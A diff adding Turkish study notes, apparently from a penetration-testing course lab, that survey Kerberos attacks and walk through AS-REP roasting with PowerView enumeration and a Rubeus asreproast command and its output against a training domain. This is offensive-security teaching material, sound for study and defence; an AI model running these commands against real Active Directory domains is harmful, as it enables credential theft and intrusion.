@@ -196,3 +196,170 @@ Gördüğünüz gibi, tüm süreç paylaşılan anahtarlara dayanır ve üçlü 
 Kerberos protokolü, işleyişi ve bileşenleri hakkında daha fazla açıklama yapmak isterseniz, [ATTL4S](https://twitter.com/DaniLJ94)'in [blogundaki](https://attl4s.github.io/) ve YouTube kanalındaki videolarını gözden geçirebilirsiniz: 
 
 [You Do (Not) Understand Kerberos.](https://www.youtube.com/watch?v=4LDpb1R3Ghg&list=PLwb6et4T42wyb8dx-LQAA0PzLjw6ZlrXh)
+
+
+## Kerberos Attacks Genel Bakış
+
+Artık Kerberos'un temel ilkelerini ele aldığımıza göre, bu protokolün sunduğu belirli zayıflıkların veya fırsatların sömürülmesine ve analizine geçeceğiz.
+
+Örneğin, **ticket** talepleri, **ticket** sahteciliği ve delegasyonla ilgili saldırıları vurgulayacağız. Ayrıca, bu protokolü kullanarak kullanıcı keşfi yapmanın ve hatta bazı hesapların parolalarını bulmak için **password spraying** yapmanın mümkün olduğunu göreceğiz.
+
+
+### Ticket Request Attacks
+
+Bir **ticket** talep etmenin iki yolu vardır:
+
+- **TGT** talebi, yani **AS-REQ**, buna karşılık olarak **KDC** bir **AS-REP** yanıtı gönderir.
+- **TGS** talebi, yani **TGS-REQ**, buna karşılık olarak **KDC** bir **TGS-REP** yanıtı gönderir.
+
+
+
+### AS-REQ Roasting
+
+Bir **TGT** talep ederken (**AS-REQ**), varsayılan olarak bir kullanıcının kimlik doğrulaması, kendi **secret** anahtarıyla şifrelenmiş bir **authenticator** ile yapılmalıdır. Ancak, eğer bir kullanıcının **preauthentication** özelliği devre dışı bırakılmışsa, o kullanıcı için kimlik doğrulama verisi talep edebiliriz ve **KDC** bir **AS-REP** mesajı döndürecektir. Bu mesajın bir kısmı (paylaşılan geçici oturum anahtarı) kullanıcının şifresiyle şifrelenmiş olduğundan, kullanıcının şifresini elde etmeye çalışmak için çevrimdışı bir **brute-force** saldırısı gerçekleştirmek mümkündür.
+
+
+### Kerberoasting
+
+Benzer şekilde, bir kullanıcı bir **TGT**'ye sahip olduğunda, mevcut herhangi bir **servis** için bir **Service Ticket** talep edebilir. **KDC** yanıtı (**TGS-REP**), **servis** hesabının **secret** anahtarıyla şifrelenmiş bilgileri içerir. Eğer **servis** hesabının şifresi zayıfsa, aynı çevrimdışı saldırıyı gerçekleştirerek o hesabın şifresini elde etmek mümkündür.
+
+
+### **Kerberos Delegation Saldırıları**  
+
+Kerberos Delegation, bir servisin bir kullanıcıyı taklit ederek başka bir kaynağa erişmesine izin verir. Kimlik doğrulama devredilir ve nihai kaynak, servise ilk kullanıcının haklarına sahipmiş gibi yanıt verir. Farklı türlerde delegasyon vardır ve her birinin, bir saldırganın (bazen keyfi) kullanıcıları taklit etmesine ve diğer servislere erişim sağlamak için kullanmasına olanak tanıyabilecek zayıflıkları bulunmaktadır. Kerberos'u kötüye kullanan şu saldırıları inceleyeceğiz: **`unconstrained delegation`**, **`constrained delegation`** ve **`resource-based constrained delegation`**.
+
+
+### **Ticket Sahteciliği Saldırıları**  
+
+Ticket'lar, keyfi ticket'ların sahteciliğini engellemek için secret anahtarlarla korunur (TGT, KDC anahtarıyla ve TGS ticket'ı servis hesabı anahtarıyla korunur). Bir saldırgan bu anahtarlardan birine sahip olursa, keyfi ticket'lar oluşturarak, keyfi haklarla servislere erişebilir. Aşağıdaki bölümler, bu iki saldırıyı açıklar: **Silver Ticket** (TGS sahteciliği) ve **Golden Ticket** (TGT sahteciliği).
+
+### **Recon ve Password Spraying**  
+
+Son olarak, Kerberos protokolü kullanılarak kullanıcılar üzerinde keşif yapılabilir ve şifreler test edilebilir. Belirli bir kullanıcı için bir TGT talep edersek, sunucu, kullanıcının veritabanında olup olmamasına bağlı olarak farklı bir şekilde yanıt verecektir. Aynı şekilde, authenticator'ı farklı şifrelerle şifreleyerek, seçilen kullanıcı için şifrenin geçerli olup olmadığını kontrol etmek mümkündür.
+
+
+Kerberos kimlik doğrulama sürecinin ayrıntılarına ve buna karşı yapılabilecek saldırılara kısa bir genel bakış yaptıktan sonra, her bir saldırıyı tek tek inceleyelim ve bunları ekli laboratuvarlarda deneyelim.
+
+
+### AS-REPRoasting
+
+**AS-REPRoasting**, en temel Kerberos saldırısıdır ve **Pre-Authentication** mekanizmasını hedef alır. Bu durum bir organizasyonda nadir görülse de, herhangi bir ön kimlik doğrulama gerektirmeyen az sayıdaki Kerberos saldırılarından biridir. Saldırganın ihtiyacı olan tek bilgi, hedef aldığı kullanıcının **username** bilgisidir ve bu bilgi, diğer keşif teknikleriyle de bulunabilir.
+
+Saldırgan **username** bilgisine sahip olduğunda, KDC'ye (**Key Distribution Center**) özel bir **AS_REQ** (**Authentication Service Request**) paketi göndererek ilgili kullanıcı gibi davranır. KDC ise bir **AS_REP** yanıtı döndürür. Bu yanıt, kullanıcının **password** bilgisinden türetilmiş bir anahtar ile şifrelenmiş bir veri içerir. Saldırgan, bu veriyi çevrimdışı olarak brute-force veya wordlist kullanarak kırarak kullanıcının **password** bilgisine ulaşabilir.
+
+
+### Nasıl Çalışıyor?
+
+**TGT** (**Ticket Granting Ticket**) talepleri, mevcut **timestamp** ve hesabın **password** bilgisi ile şifrelenir. **Domain Controller**, doğru **password** kullanıldığını doğrulamak için bu veriyi çözer. Eğer doğrulama başarılı olursa, **AS-REP** yanıtı ile kullanıcıya bir **TGT** verilir ve bu ticket, domaine yönelik sonraki kimlik doğrulama isteklerinde kullanılır.
+
+Ayrıca, **TGT** ile birlikte bir **session key** de sağlanır ve bu anahtar kullanıcının **password** bilgisi ile şifrelenmiş şekilde iletilir.
+
+![Pasted image 20250215192322.png](/img/user/Pasted%20image%2020250215192322.png)
+
+Eğer bir hesapta **pre-authentication** devre dışı bırakılmışsa, bir saldırgan herhangi bir ön kimlik doğrulama gerektirmeden ilgili hesap için şifrelenmiş bir **TGT** elde edebilir. Bu **ticket**'lar, **Hashcat** veya **John the Ripper** gibi araçlar kullanılarak **offline password attack**'lara karşı savunmasızdır.
+
+Özetle, "**Do not require Kerberos preauthentication**" ayarının etkin olduğu herhangi bir hesap için **Ticket Granting Ticket (TGT)** elde etmek mümkündür.
+
+![Pasted image 20250215192409.png](/img/user/Pasted%20image%2020250215192409.png)
+
+Birçok **vendor installation guide**, **service account**'ın bu şekilde yapılandırılmasını belirtir. **Authentication service reply (AS-REP)**, hesabın şifresiyle şifrelenir ve ağdaki herhangi biri bunu talep edebilir.
+
+**`AS-REPRoasting`**, **`Kerberoasting`** ile benzerdir, ancak **`TGS-REP`** yerine **`AS-REP`**'e yönelik bir saldırıdır.
+
+Bu ayar, **Impacket**, **PowerView** veya **PowerShell AD module** gibi **built-in tool**'lar kullanılarak **enumerate** edilebilir.
+
+Saldırı, **[Impacket](https://github.com/SecureAuthCorp/impacket)**, **[Rubeus](https://github.com/GhostPack/Rubeus) toolkit** ve diğer araçlar kullanılarak hedef hesaba ait **ticket**'ı elde etmek için gerçekleştirilebilir. Daha önce belirtildiği gibi, bu ayarın etkin olduğu hesaplara rastlamak nispeten nadirdir. Ancak, zaman zaman değerlendirmelerimizde bu durumu görebiliriz. Yine de, **Service Principal Name (SPN)** içeren hesaplar daha yaygın olup, daha sonra bu modülde ele alacağımız **Kerberoasting** saldırısına daha sık maruz kalır.
+
+Bu saldırıyı farklı şekillerde de kullanabiliriz. Örneğin, bir saldırganın bir hesap üzerinde **`GenericWrite`** veya **`GenericAll`** izinleri varsa, bu **attribute**'u etkinleştirip **AS_REP ticket** elde ederek şifreyi **offline cracking** ile kırabilir ve ardından bu ayarı tekrar devre dışı bırakabilir. Bu teknik, "**targeted AS-REPRoasting attack**" olarak da adlandırılır. Burada, ayarı etkinleştirerek **AS-REPRoasting** gerçekleştirebiliriz, ancak başarının sağlanması, kullanıcının nispeten zayıf bir şifreye sahip olmasına bağlıdır.
+
+Şimdi, bu saldırıyı bir **Windows host** üzerinden nasıl gerçekleştireceğimizi bazı örneklerle inceleyelim.
+
+
+### Enumeration
+
+**[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)**, **[UserAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) (UAC)** özelliği **DONT_REQ_PREAUTH** olarak ayarlanmış kullanıcıları **enumerate** etmek için kullanılabilir.
+
+
+#### PowerShell Enumeration of accounts with DONT_REQ_PREAUTH
+
+```
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+logoncount : 0
+badpasswordtime : 12/31/1600 7:00:00 PM
+distinguishedname : CN=Jenna Smith,OU=Server
+Team,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+objectclass : {top, person, organizationalPerson, user}
+displayname : Jenna Smith
+userprincipalname : jenna.smith@inlanefreight
+name : Jenna Smith
+objectsid : S-1-5-21-2974783224-3764228556-2640795941-
+1999
+samaccountname : jenna.smith
+admincount : 1
+codepage : 0
+samaccounttype : USER_OBJECT
+accountexpires : NEVER
+countrycode : 0
+whenchanged : 8/3/2020 8:51:43 PM
+instancetype : 4
+usncreated : 19711
+objectguid : ea3c930f-aa8e-4fdc-987c-4a9ee1a75409
+sn : smith
+lastlogoff : 12/31/1600 7:00:00 PM
+objectcategory :
+CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+dscorepropagationdata : {7/30/2020 6:28:24 PM, 7/30/2020 3:09:16
+AM, 7/30/2020 3:09:16 AM, 7/28/2020 1:45:00
+ AM...}
+givenname : jenna
+memberof : CN=Schema
+Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+lastlogon : 12/31/1600 7:00:00 PM
+badpwdcount : 0
+cn : Jenna Smith
+useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT,
+DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+whencreated : 7/27/2020 7:35:57 PM
+primarygroupid : 513
+pwdlastset : 7/27/2020 3:35:57 PM
+msds-supportedencryptiontypes : 0
+usnchanged : 89508
+```
+
+
+**Rubeus** aracı, **[preauthscan](https://github.com/GhostPack/Rubeus#preauthscan)** aksiyonuyla **pre-authentication** gerektirmeyen hesapları bulmak için de kullanılabilir.
+
+Not: **`Rubeus.exe asreproast /format:hashcat`** komutu, **`DONT_REQ_PREAUTH`** bayrağına sahip tüm hesapları **enumerate** etmek için kullanılabilir.
+
+
+### Saldırının Gerçekleştirilmesi
+
+Bu bilgilerle, **Rubeus** aracı **AS-REP**’i offline **hash cracking** için uygun formatta almak amacıyla kullanılabilir. Bu saldırı herhangi bir **domain user context** gerektirmez ve **Kerberos pre-authentication** etkin olmayan bir hesabın yalnızca adını bilerek gerçekleştirilebilir.
+
+```
+PS C:\Tools> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
+ ______ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ v1.5.0
+[*] Action: AS-REP roasting
+[*] Target User : jenna.smith
+[*] Target Domain : inlanefreight.local
+[*] Target DC : dc01.inlanefreight.local
+[*] Using domain controller: dc01.inlanefreight.local
+(fe80::c872:c68d:a355:e6f3%11)
+[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\jenna.smith'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+ [email protected]
+:9369076320<SNIP>
+
+
+```
+
+
+### Hash Cracking
